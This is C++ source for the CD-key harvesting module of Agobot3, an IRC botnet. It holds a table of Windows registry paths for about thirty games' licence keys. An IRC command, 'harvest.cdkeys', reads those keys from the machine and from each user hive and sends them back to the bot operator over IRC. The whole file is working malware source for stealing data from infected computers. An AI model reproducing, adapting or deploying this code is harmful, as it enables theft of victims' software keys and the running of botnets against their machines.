/*$T harvest_cdkeys.cpp GC 1.138 03/07/04 16:17:10 */

/*
 * Agobot3 - a modular IRC bot for Win32 / Linux Copyright (C) 2003 Ago This
 * program is free software; you can redistribute it and/or modify it under the
 * terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version. This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details. You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software Foundation, Inc.,
 * 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA. £
 * The grabber supports the following games: 1. Half-Life 2. Counter-Strike 3.
 * Legends of Might and Magic 4. Unreal Tournament 2003 5. The Gladiators 6. Need
 * For Speed Hot Pursuit 2 7. FIFA 2002 8. FIFA 2003 9. NHL 2002 10. NHL 2003 11.
 * Nascar Racing 2002 12. Nascar Racing 2003 13. Battlefield 1942 14. Battlefield
 * 1942 The Road to Rome 15. Battlefield 1942 Secret Weapons of WWII 16. Command &
 * Conquer Generals 17. Project IGI 2 18. Red Alert 19. Red Alert 2 20. Tiberian
 * Sun 21. NOX 22. Neverwinter Nights 23. Soldier of Fortune II 24. Chrome 25.
 * Hidden and Dangerous 2 26. Windows Product ID
 */
#include "main.h"
#include "mainctrl.h"
#include "harvest_cdkeys.h"

struct items
{
	char	*GameName;
	HKEY	RootKey;
	char	*SubKey;
	char	*ValueName;
};

#define MAX_KEY_LENGTH	2048
#define MAX_VALUE_NAME	16383

/* Leet cdkey code by thegeek:)
 * CDKey List, With GameNames and Registry Entries £
 * Here Is Where You Would Add New Games If You Wanted Too
 * TODO: add support for getting from files.
 */
items	CDKeyList[] =
{
	{ "[Battlefield 1942: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc", "" },
	{ "[Battlefield 1942: Secret Weapons Of WWII: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc", "" },
	{ "[Battlefield 1942: The Road To Rome: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc", "" },
	{ "[Black and White: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Black and White\\ergc", "" },
	{ "[Command and Conquer: Generals: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Generals\\ergc",	"" },
	{ "[Command and Conquer: Generals: Zero Hour: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc", "" },
	{ "[Command and Conquer: Red Alert2: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Westwood\\Red Alert 2", "Serial" },
	{ "[Command and Conquer: Tiberian Sun: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Westwood\\Tiberian Sun", "Serial" },
	{ "[Counter-Strike: ", HKEY_CURRENT_USER, "Software\\Valve\\CounterStrike\\Settings", "Key" },
	{ "[FIFA 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc", "" },
	{ "[FIFA 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", "" },
	{ "[Freedom Force: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Distribution\\Freedom Force\\ergc", "" },
	{ "[Global Operations: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Global Operations\\ergc", "" },
	{ "[Gunman Chronicles: ", HKEY_CURRENT_USER, "Software\\Valve\\Gunman\\Settings", "Key" },
	{ "[Half-Life: ", HKEY_CURRENT_USER, "Software\\Valve\\Half-Life\\Settings", "Key" },
	{ "[Hidden and Dangerous 2: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Illusion Softworks\\Hidden & Dangerous 2", "key" },
	{ "[IGI2: Covert Strike: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\IGI 2 Retail\\CDKey", "CDkey" },
	{ "[Industry Giant 2: ", HKEY_CURRENT_USER, "Software\\JoWooD\\InstalledGames\\IG2", "prvkey" },
	{ "[James Bond 007: Nightfire: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire\\ergc", "" },
	{ "[Medal of Honor: Allied Assault: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\ergc", "" },
	{ "[Medal of Honor: Allied Assault: Breakthrough ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc", "" },
	{ "[Medal of Honor: Allied Assault: Spearhead ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc", "" },
	{ "[Nascar Racing 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc",	"" },
	{ "[Nascar Racing 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc",	"" },
	{ "[NHL 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002\\ergc", "" },
	{ "[NHL 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2003\\ergc", "" },
	{ "[Need For Speed: Hot Pursuit 2: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2\\ergc", "" },
	{ "[Need For Speed: Underground: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground\\ergc", "" },
	{ "[Shogun: Total War: Warlord Edition: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition\\ergc", "" },
	{ "[Soldiers Of Anarchy: ", HKEY_CURRENT_USER,	"Software\\Silver Style Entertainment\\Soldiers Of Anarchy\\Settings", "CDKey" },
	{ "[The Gladiators: ", HKEY_CURRENT_USER, "Software\\Eugen Systems\\The Gladiators", "RegNumber" },
	{ "[Unreal Tournament 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Unreal Technology\\Installed Apps\\UT2003", "CDKey" },
};

char	szKey[1024];
char	*szLogText;

/*
 =======================================================================================================================
 =======================================================================================================================
 */
void CHarvest_CDKeys::Init(void)
{
	REGCMD(m_cmdCDKeys, "harvest.cdkeys", "makes the bot get a list of cdkeys", false, this);
}

/*
 =======================================================================================================================
 =======================================================================================================================
 */
bool CHarvest_CDKeys::HandleCommand(CMessage *pMsg)
{
	if(!pMsg->sCmd.Compare("harvest.cdkeys"))
	{
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
#ifdef WIN32
#define arraysize(x)	(sizeof(x) / sizeof(x[0]))
		DWORD			dwSize = 2048;
		unsigned char	szBuffer[2048];
		int				i;
		char			*UserKey = (char *) malloc(128);
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

		szLogText = new char[2048];
		memset(szLogText, 0, 2048);

		for(i = 0; i < arraysize(CDKeyList); i++)
		{
			if(CDKeyList[i].RootKey != HKEY_CURRENT_USER)
			{
				/*~~~~~~~~~~~~~~*/
				HKEY	rk = NULL;
				/*~~~~~~~~~~~~~~*/

				sprintf(UserKey, "%s", CDKeyList[i].SubKey);
				memset(szBuffer, 0, sizeof(szBuffer));
				memset(szKey, 0, sizeof(szKey));
				memset(szLogText, 0, sizeof(szLogText));
				if(RegOpenKeyEx(CDKeyList[i].RootKey, UserKey, 0, KEY_READ, &rk) != ERROR_SUCCESS)
				{
				}

				if(RegQueryValueEx(rk, CDKeyList[i].ValueName, NULL, NULL, szBuffer, &dwSize) != ERROR_SUCCESS)
				{
				}

				if(RegQueryValueEx(rk, CDKeyList[i].ValueName, NULL, NULL, szBuffer, &dwSize) == ERROR_SUCCESS)
				{
					g_pMainCtrl->m_cIRC.SendFormat
						(
							pMsg->bSilent,
							pMsg->bNotice,
							pMsg->sReplyTo.Str(),
							"%s%s]\n",
							CDKeyList[i].GameName,
							szBuffer
						);
				}

				RegCloseKey(rk);

				/*
				 * strcat(szLogText, rKeyString); £
				 * ReadKey(szKey, CDKeyList[i].GameName, CDKeyList[i].RootKey,CDKeyList[i].SubKey,
				 * CDKeyList[i].ValueName, dwSize, szBuffer);
				 * g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice,
				 * pMsg->sReplyTo.Str(), szKey);
				 */
			}

			if(CDKeyList[i].RootKey == HKEY_CURRENT_USER)
			{
				/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
				CHAR		achKey[2048];				/* buffer for subkey name */
				DWORD		cbName;						/* size of name string */
				CHAR		achClass[MAX_PATH] = "";	/* buffer for class name */
				DWORD		cchClassName = MAX_PATH;	/* size of class string */
				DWORD		cSubKeys = 0;				/* number of subkeys */
				DWORD		cbMaxSubKey;				/* longest subkey size */
				DWORD		cchMaxClass;				/* longest class string */
				DWORD		cValues;					/* number of values for key */
				DWORD		cchMaxValue;				/* longest value name */
				DWORD		cbMaxValueData;				/* longest value data */
				DWORD		cbSecurityDescriptor;		/* size of security descriptor */
				FILETIME	ftLastWriteTime;			/* last write time */
				DWORD		retCode;
				int			u;
				CHAR		achValue[MAX_VALUE_NAME];
				DWORD		cchValue = MAX_VALUE_NAME;
				/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

				/*
				 * g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice,
				 * pMsg->sReplyTo.Str(), CDKeyList[i].GameName); £
				 * Get the class name and the value count.
				 */
				retCode = RegQueryInfoKey
					(
						CDKeyList[i].RootKey,			/* key handle */
						achClass,						/* buffer for class name */
						&cchClassName,					/* size of class string */
						NULL,					/* reserved */
						&cSubKeys,				/* number of subkeys */
						&cbMaxSubKey,			/* longest subkey size */
						&cchMaxClass,			/* longest class string */
						&cValues,				/* number of values for this key */
						&cchMaxValue,			/* longest value name */
						&cbMaxValueData,		/* longest value data */
						&cbSecurityDescriptor,	/* security descriptor */
						&ftLastWriteTime		/* last write time */
					);

				/* Enumerate the subkeys, until RegEnumKeyEx fails. */
				if(cSubKeys)
				{
					for(u = 0; u < cSubKeys; u++)
					{
						cbName = MAX_KEY_LENGTH;
						retCode = RegEnumKeyEx(HKEY_USERS, u, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime);
						if(retCode == ERROR_SUCCESS)
						{
							/*~~~~~~~~~~~~~~*/
							HKEY	rk = NULL;
							/*~~~~~~~~~~~~~~*/

							sprintf(UserKey, "%s\\%s", achKey, CDKeyList[i].SubKey);
							memset(szBuffer, 0, sizeof(szBuffer));
							memset(szKey, 0, sizeof(szKey));
							if(RegOpenKeyEx(HKEY_USERS, UserKey, 0, KEY_READ, &rk) != ERROR_SUCCESS)
							{
							}

							if
							(
								RegQueryValueEx
									(
										rk,
										CDKeyList[i].ValueName,
										NULL,
										NULL,
										szBuffer,
										&dwSize
									) != ERROR_SUCCESS
							)
							{
								RegCloseKey(rk);
							}

							if
							(
								RegQueryValueEx
									(
										rk,
										CDKeyList[i].ValueName,
										NULL,
										NULL,
										szBuffer,
										&dwSize
									) == ERROR_SUCCESS
							)
							{
								g_pMainCtrl->m_cIRC.SendFormat
									(
										pMsg->bSilent,
										pMsg->bNotice,
										pMsg->sReplyTo.Str(),
										"%s%s]\n",
										CDKeyList[i].GameName,
										szBuffer
									);
							}

							RegCloseKey(rk);
						}
					}
				}
			}
		}

		return true;
	}
#endif
	return false;
}

